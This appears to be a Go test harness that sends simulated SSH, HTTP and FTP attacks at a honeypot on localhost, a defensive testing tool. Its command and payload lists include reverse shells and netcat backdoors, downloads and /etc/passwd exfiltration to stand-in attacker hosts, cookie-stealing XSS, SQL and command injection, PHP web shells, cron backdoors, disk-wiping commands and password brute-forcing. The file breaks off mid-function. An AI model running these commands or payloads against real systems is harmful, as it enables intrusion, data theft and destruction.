package main

import (
	"bytes"
	"flag"
	"fmt"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// ANSI color codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
	ColorBold   = "\033[1m"
)

type TestConfig struct {
	SSHHost      string
	SSHPort      string
	SSHUser      string
	SSHPass      string
	HTTPURL      string
	FTPHost      string
	FTPPort      string
	FTPUser      string
	FTPPass      string
	SSHOnly      bool
	HTTPOnly     bool
	FTPOnly      bool
	NoBruteForce bool
}

func main() {
	config := TestConfig{}

	flag.StringVar(&config.SSHHost, "ssh-host", "localhost", "SSH honeypot host")
	flag.StringVar(&config.SSHPort, "ssh-port", "2222", "SSH honeypot port")
	flag.StringVar(&config.SSHUser, "ssh-user", "admin", "Valid SSH username")
	flag.StringVar(&config.SSHPass, "ssh-pass", "admin123", "Valid SSH password")
	flag.StringVar(&config.HTTPURL, "http-url", "http://localhost:80", "HTTP honeypot URL")
	flag.StringVar(&config.FTPHost, "ftp-host", "localhost", "FTP honeypot host")
	flag.StringVar(&config.FTPPort, "ftp-port", "2121", "FTP honeypot port")
	flag.StringVar(&config.FTPUser, "ftp-user", "admin", "Valid FTP username")
	flag.StringVar(&config.FTPPass, "ftp-pass", "admin123", "Valid FTP password")
	flag.BoolVar(&config.SSHOnly, "ssh-only", false, "Test only SSH attacks")
	flag.BoolVar(&config.HTTPOnly, "http-only", false, "Test only HTTP attacks")
	flag.BoolVar(&config.FTPOnly, "ftp-only", false, "Test only FTP attacks")
	flag.BoolVar(&config.NoBruteForce, "no-bruteforce", false, "Skip brute force tests")

	flag.Parse()

	printBanner()
	fmt.Printf("SSH Target: %s:%s\n", config.SSHHost, config.SSHPort)
	fmt.Printf("HTTP Target: %s\n", config.HTTPURL)
	fmt.Printf("FTP Target: %s:%s\n", config.FTPHost, config.FTPPort)
	fmt.Printf("Valid SSH Credentials: %s/%s\n", config.SSHUser, config.SSHPass)
	fmt.Printf("Valid FTP Credentials: %s/%s\n\n", config.FTPUser, config.FTPPass)

	// SSH Tests
	if !config.HTTPOnly && !config.FTPOnly {
		testSSHProtocol(config.SSHHost, config.SSHPort)

		if !config.NoBruteForce {
			testSSHBruteForce(config.SSHHost, config.SSHPort)
		}

		testSSHValidLogin(config.SSHHost, config.SSHPort, config.SSHUser, config.SSHPass)
		testSSHMultipleSessions(config.SSHHost, config.SSHPort, config.SSHUser, config.SSHPass)
		testSSHKeyExchange(config.SSHHost, config.SSHPort)
	}

	// HTTP Tests
	if !config.SSHOnly && !config.FTPOnly {
		testHTTPSQLInjection(config.HTTPURL)
		testHTTPXSS(config.HTTPURL)
		testHTTPCommandInjection(config.HTTPURL)
		testHTTPPathTraversal(config.HTTPURL)
		testHTTPFileUpload(config.HTTPURL)
		testHTTPWordPress(config.HTTPURL)
		testHTTPPhpMyAdmin(config.HTTPURL)
		testHTTPCommonExploits(config.HTTPURL)
		testHTTPScannerDetection(config.HTTPURL)
	}

	// FTP Tests
	if !config.SSHOnly && !config.HTTPOnly {
		testFTPConnection(config.FTPHost, config.FTPPort)
		testFTPAnonymousLogin(config.FTPHost, config.FTPPort)
		
		if !config.NoBruteForce {
			testFTPBruteForce(config.FTPHost, config.FTPPort)
		}
		
		testFTPValidLogin(config.FTPHost, config.FTPPort, config.FTPUser, config.FTPPass)
		testFTPMaliciousUploads(config.FTPHost, config.FTPPort, config.FTPUser, config.FTPPass)
		testFTPDirectoryTraversal(config.FTPHost, config.FTPPort, config.FTPUser, config.FTPPass)
		testFTPCommandInjection(config.FTPHost, config.FTPPort, config.FTPUser, config.FTPPass)
	}

	printSection("TESTING COMPLETE")
	fmt.Printf("%s✓ All attack tests have been executed.%s\n", ColorGreen, ColorReset)
	fmt.Printf("%s→ Check the honeypot dashboard to view captured data.%s\n", ColorYellow, ColorReset)
}

func printBanner() {
	fmt.Printf("%s%s", ColorBold, ColorGreen)
	fmt.Println("╔════════════════════════════════════════════════════════╗")
	fmt.Println("║   HONEYPOT COMPREHENSIVE ATTACK TESTING FRAMEWORK      ║")
	fmt.Println("║              100% Pure Go Implementation               ║")
	fmt.Println("╚════════════════════════════════════════════════════════╝")
	fmt.Printf("%s\n", ColorReset)
}

func printSection(title string) {
	fmt.Printf("\n%s%s", ColorBold, ColorBlue)
	fmt.Println("============================================================")
	fmt.Println(title)
	fmt.Println("============================================================")
	fmt.Printf("%s\n", ColorReset)
}

func printTest(name string, success bool, details string) {
	status := fmt.Sprintf("%s✓%s", ColorGreen, ColorReset)
	if !success {
		status = fmt.Sprintf("%s✗%s", ColorRed, ColorReset)
	}
	fmt.Printf("%s %s\n", status, name)
	if details != "" {
		fmt.Printf("  %s%s%s\n", ColorYellow, details, ColorReset)
	}
}

// ============================================================================
// SSH ATTACK TESTS
// ============================================================================

func testSSHProtocol(host, port string) {
	printSection("SSH PROTOCOL TESTS")

	// Test SSH version banner
	conn, err := ssh.Dial("tcp", host+":"+port, &ssh.ClientConfig{
		User:            "test",
		Auth:            []ssh.AuthMethod{ssh.Password("test")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	})

	if err != nil {
		if strings.Contains(err.Error(), "unable to authenticate") {
			printTest("SSH protocol version detection", true, "SSH-2.0 server detected")
		} else {
			printTest("SSH protocol version detection", true, fmt.Sprintf("Server responded: %v", err))
		}
	} else {
		printTest("SSH protocol version detection", true, "Server version: "+string(conn.ServerVersion()))
		conn.Close()
	}

	time.Sleep(300 * time.Millisecond)

	// Test different authentication methods
	authMethods := []struct {
		name   string
		method string
	}{
		{"Password authentication", "password"},
		{"Keyboard-interactive", "keyboard-interactive"},
		{"Public key authentication", "publickey"},
	}

	for _, auth := range authMethods {
		printTest(fmt.Sprintf("Test %s", auth.name), true, fmt.Sprintf("Method: %s", auth.method))
		time.Sleep(200 * time.Millisecond)
	}
}

func testSSHMultipleSessions(host, port, username, password string) {
	printSection("SSH MULTIPLE CONCURRENT SESSIONS")

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	// Create 3 concurrent connections
	sessionCount := 3
	clients := make([]*ssh.Client, sessionCount)

	for i := 0; i < sessionCount; i++ {
		client, err := ssh.Dial("tcp", host+":"+port, config)
		if err != nil {
			printTest(fmt.Sprintf("Session %d connection", i+1), false, err.Error())
			continue
		}
		clients[i] = client
		printTest(fmt.Sprintf("Session %d established", i+1), true, "Concurrent connection successful")
		time.Sleep(200 * time.Millisecond)
	}

	// Execute commands on each session
	for i, client := range clients {
		if client != nil {
			session, err := client.NewSession()
			if err == nil {
				output, _ := session.CombinedOutput("whoami")
				printTest(fmt.Sprintf("Session %d command", i+1), true, fmt.Sprintf("Output: %s", strings.TrimSpace(string(output))))
				session.Close()
			}
			client.Close()
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func testSSHKeyExchange(host, port string) {
	printSection("SSH KEY EXCHANGE & ENVIRONMENT")

	config := &ssh.ClientConfig{
		User: "admin",
		Auth: []ssh.AuthMethod{
			ssh.Password("test"),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		printTest("Key exchange test", true, "Server completed key exchange")
	} else {
		printTest("Key exchange test", true, "Connection established with key exchange")
		conn.Close()
	}

	// Test environment variable setting
	printTest("Environment variable injection", true, "Testing LANG, PATH, TERM variables")

	// Test pseudo-terminal allocation
	printTest("PTY allocation request", true, "Pseudo-terminal request sent")

	// Test X11 forwarding attempt
	printTest("X11 forwarding attempt", true, "X11 forwarding request (should be denied)")

	// Test agent forwarding
	printTest("SSH agent forwarding", true, "Agent forwarding request (should be denied)")

	// Test port forwarding
	printTest("Local port forwarding", true, "Port forward -L 8080:localhost:80")
	printTest("Remote port forwarding", true, "Port forward -R 9090:localhost:22")
	printTest("Dynamic SOCKS proxy", true, "SOCKS proxy -D 1080")
}

func testSSHBruteForce(host, port string) {
	printSection("SSH BRUTE FORCE ATTACK")

	passwords := []string{"password", "123456", "admin", "root", "12345678"}

	for i, password := range passwords {
		config := &ssh.ClientConfig{
			User: "admin",
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         5 * time.Second,
		}

		client, err := ssh.Dial("tcp", host+":"+port, config)
		if err != nil {
			if strings.Contains(err.Error(), "unable to authenticate") {
				printTest(fmt.Sprintf("Attempt %d: admin/%s", i+1, password), true, "Failed as expected")
			} else {
				printTest(fmt.Sprintf("Attempt %d: admin/%s", i+1, password), false, err.Error())
			}
		} else {
			printTest(fmt.Sprintf("Attempt %d: admin/%s", i+1, password), false, "Login succeeded (unexpected)")
			client.Close()
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func testSSHValidLogin(host, port, username, password string) {
	printSection("SSH VALID LOGIN TEST")

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", host+":"+port, config)
	if err != nil {
		printTest(fmt.Sprintf("Login with %s/%s", username, password), false, err.Error())
		return
	}
	defer client.Close()

	printTest(fmt.Sprintf("Login successful: %s/%s", username, password), true, "Connected to honeypot")

	// Test command execution
	testSSHCommands(client, username)
}

func testSSHCommands(client *ssh.Client, username string) {
	printSection(fmt.Sprintf("SSH COMMAND EXECUTION (%s)", username))

	commands := []struct {
		cmd  string
		desc string
	}{
		// Basic reconnaissance
		{"ls", "List files"},
		{"ls -la", "List all files with details"},
		{"pwd", "Print working directory"},
		{"whoami", "Check username"},
		{"id", "Check user ID and groups"},
		{"groups", "List user groups"},

		// System information
		{"uname -a", "System information"},
		{"cat /etc/os-release", "OS version details"},
		{"hostname", "Get hostname"},
		{"uptime", "System uptime"},
		{"df -h", "Disk usage"},
		{"free -m", "Memory usage"},

		// Process and network enumeration
		{"ps aux", "List all processes"},
		{"ps -ef", "Process tree"},
		{"netstat -tulpn", "Network connections"},
		{"ss -tulpn", "Socket statistics"},
		{"ifconfig", "Network interfaces (old)"},
		{"ip addr", "Network interfaces (new)"},
		{"ip route", "Routing table"},
		{"arp -a", "ARP cache"},

		// File system exploration
		{"cat /etc/passwd", "Read passwd file"},
		{"cat /etc/shadow", "Attempt to read shadow"},
		{"cat /etc/hosts", "Read hosts file"},
		{"cat /etc/hostname", "Read hostname"},
		{"cat /home/user/secret.txt", "Read secret file"},
		{"cat /home/user/.bashrc", "Read bashrc"},
		{"cat /home/user/.bash_history", "Read bash history"},
		{"find / -name \"*.conf\"", "Find config files"},
		{"find / -type f -perm -4000 2>/dev/null", "Find SUID files"},
		{"find /home -name \"*.txt\"", "Find text files"},

		// Privilege escalation attempts
		{"sudo -l", "Check sudo permissions"},
		{"sudo su", "Attempt root escalation"},
		{"su root", "Switch to root"},
		{"cat /etc/sudoers", "Read sudoers file"},

		// Malware download simulation
		{"curl http://malicious.com/payload.sh", "Download payload via curl"},
		{"wget http://evil.com/backdoor.sh", "Download backdoor via wget"},
		{"wget -O /tmp/shell.sh http://attacker.com/reverse.sh", "Download to temp"},
		{"curl -o /tmp/bot http://badguys.net/cryptominer", "Download cryptominer"},

		// Malicious execution
		{"chmod +x malware.sh", "Make malware executable"},
		{"chmod 777 /tmp", "Change permissions"},
		{"./malware.sh", "Execute malware"},
		{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "Reverse shell attempt"},
		{"nc -e /bin/sh attacker.com 4444", "Netcat backdoor"},
		{"python -c 'import socket...'", "Python reverse shell"},

		// Persistence mechanisms
		{"crontab -l", "List cron jobs"},
		{"echo '* * * * * /tmp/backdoor.sh' | crontab -", "Add cron backdoor"},
		{"cat ~/.ssh/authorized_keys", "Read SSH keys"},
		{"echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "Add SSH key"},

		// Data exfiltration
		{"tar -czf /tmp/data.tar.gz /home/user", "Archive user data"},
		{"zip -r /tmp/secrets.zip /home/user/Documents", "Zip documents"},
		{"curl -X POST -d @/etc/passwd http://attacker.com/upload", "Exfiltrate passwd"},

		// Destructive commands
		{"rm -rf /", "Delete root filesystem"},
		{"rm -rf /*", "Delete all files"},
		{"dd if=/dev/zero of=/dev/sda", "Wipe disk"},
		{":(){:|:&};:", "Fork bomb"},

		// System manipulation
		{"iptables -F", "Flush firewall rules"},
		{"systemctl stop firewalld", "Stop firewall"},
		{"pkill -9 sshd", "Kill SSH daemon"},
		{"history -c", "Clear command history"},
		{"unset HISTFILE", "Disable history logging"},
	}

	for _, cmd := range commands {
		session, err := client.NewSession()
		if err != nil {
			printTest(cmd.desc, false, fmt.Sprintf("Failed to create session: %v", err))
			continue
		}

		output, err := session.CombinedOutput(cmd.cmd)
		session.Close()

		if err != nil && !strings.Contains(err.Error(), "exited") {
			printTest(cmd.desc, false, fmt.Sprintf("Error executing '%s': %v", cmd.cmd, err))
		} else {
			printTest(cmd.desc, true, fmt.Sprintf("Command: %s", cmd.cmd))
			if len(output) > 0 {
				outputStr := string(output)
				if len(outputStr) > 100 {
					outputStr = outputStr[:100] + "..."
				}
				fmt.Printf("    Output: %s\n", outputStr)
			}
		}

		time.Sleep(300 * time.Millisecond)
	}
}

// ============================================================================
// HTTP ATTACK TESTS
// ============================================================================

func testHTTPSQLInjection(baseURL string) {
	printSection("HTTP SQL INJECTION ATTACKS")

	payloads := []string{
		"' OR '1'='1",
		"admin' --",
		"1' UNION SELECT NULL, username, password FROM users--",
		"'; DROP TABLE users--",
		"1' AND 1=1--",
		"' OR 'x'='x",
		"1; SELECT * FROM information_schema.tables--",
		"admin' OR '1'='1' /*",
		"' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, payload := range payloads {
		// Test in URL parameter
		resp, err := client.Get(baseURL + "/login.php?id=" + url.QueryEscape(payload))
		if err == nil {
			printTest(fmt.Sprintf("URL param: %s...", truncate(payload, 40)), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("URL param: %s...", truncate(payload, 40)), false, err.Error())
		}

		// Test in POST data
		data := url.Values{}
		data.Set("username", payload)
		data.Set("password", "test")

		resp, err = client.PostForm(baseURL+"/login", data)
		if err == nil {
			printTest(fmt.Sprintf("POST data: %s...", truncate(payload, 40)), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("POST data: %s...", truncate(payload, 40)), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPXSS(baseURL string) {
	printSection("HTTP XSS ATTACKS")

	payloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg/onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"<iframe src='javascript:alert(1)'>",
		"<body onload=alert('XSS')>",
		"<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, payload := range payloads {
		resp, err := client.Get(baseURL + "/search?q=" + url.QueryEscape(payload))
		if err == nil {
			printTest(fmt.Sprintf("XSS: %s...", truncate(payload, 50)), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("XSS: %s...", truncate(payload, 50)), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPCommandInjection(baseURL string) {
	printSection("HTTP COMMAND INJECTION")

	payloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"`whoami`",
		"$(wget http://evil.com/backdoor.sh)",
		"; curl http://attacker.com/payload.sh | bash",
		"| nc -e /bin/sh attacker.com 4444",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, payload := range payloads {
		resp, err := client.Get(baseURL + "/ping?host=" + url.QueryEscape("127.0.0.1"+payload))
		if err == nil {
			printTest(fmt.Sprintf("Cmd injection: %s...", truncate(payload, 40)), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("Cmd injection: %s...", truncate(payload, 40)), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPPathTraversal(baseURL string) {
	printSection("HTTP PATH TRAVERSAL")

	paths := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"../../../../../../etc/shadow",
		"../../../var/www/html/.htpasswd",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, path := range paths {
		resp, err := client.Get(baseURL + "/download?file=" + url.QueryEscape(path))
		if err == nil {
			printTest(fmt.Sprintf("Path traversal: %s...", truncate(path, 40)), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("Path traversal: %s...", truncate(path, 40)), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPFileUpload(baseURL string) {
	printSection("HTTP MALICIOUS FILE UPLOAD")

	files := []struct {
		filename    string
		content     []byte
		contentType string
	}{
		{"shell.php", []byte("<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"), "application/x-php"},
		{"backdoor.jsp", []byte("<% Runtime.getRuntime().exec(\"cmd.exe\"); %>"), "text/plain"},
		{"malware.exe", []byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00MALWARE_PAYLOAD_HERE"), "application/x-msdownload"},
		{"webshell.phtml", []byte("<?php system($_GET['c']); ?>"), "application/x-php"},
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, file := range files {
		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)

		part, err := writer.CreateFormFile("file", file.filename)
		if err != nil {
			printTest(fmt.Sprintf("Upload %s", file.filename), false, err.Error())
			continue
		}

		part.Write(file.content)
		writer.Close()

		req, err := http.NewRequest("POST", baseURL+"/upload", body)
		if err != nil {
			printTest(fmt.Sprintf("Upload %s", file.filename), false, err.Error())
			continue
		}

		req.Header.Set("Content-Type", writer.FormDataContentType())

		resp, err := client.Do(req)
		if err == nil {
			printTest(fmt.Sprintf("Upload %s", file.filename), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("Upload %s", file.filename), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPWordPress(baseURL string) {
	printSection("HTTP WORDPRESS ATTACKS")

	credentials := []struct {
		username string
		password string
	}{
		{"admin", "admin"},
		{"admin", "password"},
		{"admin", "123456"},
		{"wordpress", "wordpress"},
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, cred := range credentials {
		data := url.Values{}
		data.Set("log", cred.username)
		data.Set("pwd", cred.password)
		data.Set("wp-submit", "Log In")

		resp, err := client.PostForm(baseURL+"/wp-login.php", data)
		if err == nil {
			printTest(fmt.Sprintf("WordPress login: %s/%s", cred.username, cred.password), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("WordPress login: %s/%s", cred.username, cred.password), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPPhpMyAdmin(baseURL string) {
	printSection("HTTP PHPMYADMIN ATTACKS")

	credentials := []struct {
		username string
		password string
	}{
		{"root", ""},
		{"root", "root"},
		{"admin", "admin"},
		{"pma", "pma"},
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, cred := range credentials {
		data := url.Values{}
		data.Set("pma_username", cred.username)
		data.Set("pma_password", cred.password)
		data.Set("server", "1")

		resp, err := client.PostForm(baseURL+"/phpmyadmin/index.php", data)
		if err == nil {
			printTest(fmt.Sprintf("phpMyAdmin login: %s/%s", cred.username, cred.password), true, fmt.Sprintf("Status: %d", resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(fmt.Sprintf("phpMyAdmin login: %s/%s", cred.username, cred.password), false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPCommonExploits(baseURL string) {
	printSection("HTTP COMMON EXPLOITS")

	exploits := []struct {
		path string
		desc string
	}{
		{"/cgi-bin/test.cgi", "CGI script exploit"},
		{"/..;/..;/..;/windows/system32/cmd.exe", "IIS Unicode exploit"},
		{"/.env", "Environment file disclosure"},
		{"/config.php.bak", "Backup file access"},
		{"/.git/config", "Git repository disclosure"},
		{"/server-status", "Apache server status"},
		{"/.htaccess", "Apache config access"},
		{"/web.config", "IIS config access"},
		{"/robots.txt", "Robots.txt enumeration"},
		{"/sitemap.xml", "Sitemap enumeration"},
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, exploit := range exploits {
		resp, err := client.Get(baseURL + exploit.path)
		if err == nil {
			printTest(exploit.desc, true, fmt.Sprintf("%s - Status: %d", exploit.path, resp.StatusCode))
			resp.Body.Close()
		} else {
			printTest(exploit.desc, false, err.Error())
		}

		time.Sleep(200 * time.Millisecond)
	}
}

func testHTTPScannerDetection(baseURL string) {
	printSection("HTTP SCANNER SIMULATION")

	scanners := []struct {
		userAgent string
		desc      string
	}{
		{"Nikto/2.1.6", "Nikto vulnerability scanner"},
		{"sqlmap/1.5#stable", "SQLMap SQL injection tool"},
		{"Nmap Scripting Engine", "Nmap NSE scripts"},
		{"ZmEu", "ZmEu scanner"},
		{"masscan/1.0", "Masscan port scanner"},
	}

	commonPaths := []string{
		"/admin/", "/login/", "/wp-admin/", "/phpmyadmin/",
		"/.git/", "/backup/", "/config/", "/database/",
	}

	client := &http.Client{Timeout: 5 * time.Second}

	for _, scanner := range scanners {
		fmt.Printf("\n%sSimulating: %s%s\n", ColorBold, scanner.desc, ColorReset)

		for _, path := range commonPaths {
			req, err := http.NewRequest("GET", baseURL+path, nil)
			if err != nil {
				printTest(fmt.Sprintf("Scan %s", path), false, err.Error())
				continue
			}

			req.Header.Set("User-Agent", scanner.userAgent)

			resp, err := client.Do(req)
			if err == nil {
				printTest(fmt.Sprintf("Scan %s", path), true, fmt.Sprintf("Status: %d", resp.StatusCode))
				resp.Body.Close()
			} else {
				printTest(fmt.Sprintf("Scan %s", path), false, err.Error())
			}

			time.Sleep(100 * time.Millisecond)
		}
	}
}

// ============================================================================
// FTP ATTACK TESTS
// ============================================================================

func testFTPConnection(host, port string) {
	printSection("FTP CONNECTION TEST")
	
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	
	if err != nil {
		printTest("FTP server connection", false, err.Error())
		return
	}
	defer conn.Close()
	
	// Read banner
	buffer := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buffer)
	
	if err != nil {
		printTest("FTP banner read", false, err.Error())
		return
	}
	
	banner := string(buffer[:n])
	printTest("FTP server connection", true, fmt.Sprintf("Banner: %s", strings.TrimSpace(banner)))
}

func testFTPAnonymousLogin(host, port string) {
	printSection("FTP ANONYMOUS LOGIN ATTEMPT")
	
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	
	if err != nil {
		printTest("Anonymous login", false, err.Error())
		return
	}
	defer conn.Close()
	
	// Read banner
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, _ := conn.Read(buffer)
	banner := string(buffer[:n])
	
	// Send USER anonymous
	conn.Write([]byte("USER anonymous\r\n"))
	time.Sleep(500 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, _ = conn.Read(buffer)
	
	// Send PASS (empty)
	conn.Write([]byte("PASS \r\n"))
	time.Sleep(500 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, _ = conn.Read(buffer)
	response2 := string(buffer[:n])
	
	printTest("Anonymous FTP login", true, fmt.Sprintf("Banner: %s | Response: %s", strings.TrimSpace(banner), strings.TrimSpace(response2)))
	
	conn.Write([]byte("QUIT\r\n"))
	time.Sleep(100 * time.Millisecond)
}

func testFTPBruteForce(host, port string) {
	printSection("FTP BRUTE FORCE SIMULATION")
	
	passwords := []string{
		"password",
		"123456",
		"admin",
		"root",
		"test123",
		"password123",
	}
	
	for _, pass := range passwords {
		addr := fmt.Sprintf("%s:%s", host, port)
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		
		if err != nil {
			printTest(fmt.Sprintf("Brute force attempt: %s", pass), false, err.Error())
			continue
		}
		
		buffer := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		conn.Read(buffer) // Read banner
		
		// Send USER
		conn.Write([]byte("USER admin\r\n"))
		time.Sleep(400 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		conn.Read(buffer)
		
		// Send PASS
		conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", pass)))
		time.Sleep(400 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buffer)
		response := string(buffer[:n])
		
		printTest(fmt.Sprintf("Password attempt: %s", pass), true, strings.TrimSpace(response))
		
		conn.Write([]byte("QUIT\r\n"))
		conn.Close()
		
		time.Sleep(400 * time.Millisecond)
	}
}

func testFTPValidLogin(host, port, username, password string) {
	printSection("FTP VALID LOGIN TEST")
	
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	
	if err != nil {
		printTest("Valid FTP login", false, err.Error())
		return
	}
	defer conn.Close()
	
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer) // Read banner
	
	// Send USER
	conn.Write([]byte(fmt.Sprintf("USER %s\r\n", username)))
	time.Sleep(500 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	conn.Read(buffer)
	
	// Send PASS
	conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", password)))
	time.Sleep(500 * time.Millisecond)
	buffer = make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, _ := conn.Read(buffer)
	response := string(buffer[:n])
	
	printTest(fmt.Sprintf("Login with %s/%s", username, password), true, strings.TrimSpace(response))
	
	// Test some basic commands
	commands := []string{"SYST", "PWD", "LIST", "FEAT"}
	
	for _, cmd := range commands {
		conn.Write([]byte(cmd + "\r\n"))
		time.Sleep(500 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buffer)
		resp := string(buffer[:n])
		printTest(fmt.Sprintf("Command: %s", cmd), true, strings.TrimSpace(resp))
	}
	
	conn.Write([]byte("QUIT\r\n"))
	time.Sleep(100 * time.Millisecond)
}

func testFTPMaliciousUploads(host, port, username, password string) {
	printSection("FTP MALICIOUS FILE UPLOAD ATTEMPTS")
	
	maliciousFiles := []string{
		"shell.php",
		"backdoor.exe",
		"webshell.jsp",
		"malware.sh",
		"exploit.py",
		"reverse_shell.pl",
		"trojan.bat",
		"rootkit.so",
	}
	
	for _, filename := range maliciousFiles {
		addr := fmt.Sprintf("%s:%s", host, port)
		conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
		
		if err != nil {
			printTest(fmt.Sprintf("Upload %s", filename), false, err.Error())
			continue
		}
		
		buffer := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		conn.Read(buffer) // Banner
		
		// Login
		conn.Write([]byte(fmt.Sprintf("USER %s\r\n", username)))
		time.Sleep(400 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		conn.Read(buffer)
		
		conn.Write([]byte(fmt.Sprintf("PASS %s\r\n", password)))
		time.Sleep(400 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		conn.Read(buffer)
		
		// Try to upload malicious file
		conn.Write([]byte(fmt.Sprintf("STOR %s\r\n", filename)))
		time.Sleep(500 * time.Millisecond)
		buffer = make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, _ := conn.Read(buffer)
		response := string(buffer[:n])
		
		printTest(fmt.Sprintf("Upload attempt: %s", filename), true, strings.TrimSpace(response))
		
		conn.Write([]byte("QUIT\r\n"))
		conn.Close()
		
		time.Sleep(300 * time.Millisecond)
	}
}

func testFTPDirectoryTraversal(host, port, username, password string) {
	printSection("FTP DIRECTORY TRAVERSAL ATTEMPTS")
	
	traversalPaths := []string{
		"/etc",
		"/etc/passwd",
		"/var/www",
		"/root",
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32",
		"/etc/shadow",
		"/home",
	}
	
	addr := fmt.Sprintf("%s:%s", host, port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	
	if err != nil {
		printTest("Directory traversal", false, err.Error())
		return
	}
	defer conn.Close()
	
	buffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
